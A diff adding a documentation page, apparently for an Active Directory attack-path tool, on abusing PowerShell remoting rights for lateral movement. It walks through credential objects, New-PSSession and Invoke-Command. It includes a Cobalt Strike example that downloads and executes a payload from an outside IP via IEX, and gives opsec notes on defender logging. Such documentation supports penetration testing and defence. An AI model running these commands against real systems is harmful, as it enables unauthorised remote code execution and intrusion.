@@ -1,0 +1,64 @@
+---
+title: CanPSRemote
+description: "PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system."
+---
+
+<Frame>
+  <img src="/hc/images/image-2-1.png"/>
+</Frame>
+
+<Info>
+**Note**
+
+This edge does not guarantee privileged execution.
+</Info>
+
+## Abuse Info
+
+Abuse of this privilege will require you to have interactive access with a system on the network.
+
+A remote session can be opened using the New-PSSession powershell command.
+
+You may need to authenticate to the Domain Controller as the user with the PSRemote rights on the target computer if you are not running as that user. To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+```bash
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
+```
+
+Then use the New-PSSession command with the credential we just created:
+
+```bash
+$session = New-PSSession -ComputerName &lt;target computer name&gt; -Credential $Cred
+```
+This will open a PowerShell session on the target computer
+
+You can then run a command on the system using the Invoke-Command cmdlet and the session you just created
+
+```bash
+Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}
+```
+
+Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.
+
+```bash
+Disconnect-PSSession -Session $session
+Remove-PSSession -Session $session
+```
+An example of running through this Cobalt Strike for lateral movement is as follows:
+
+```bash
+powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session
+-ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))};
+Disconnect-PSSession -Session $session; Remove-PSSession -Session $session
+```
+## Opsec Considerations
+
+When using the PowerShell functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what’s going on with PowerShell in their network, such as script block logging and AMSI.
+
+Entering a PSSession will generate a logon event on the target computer.
+
+## References
+
+* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7)
+* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7)
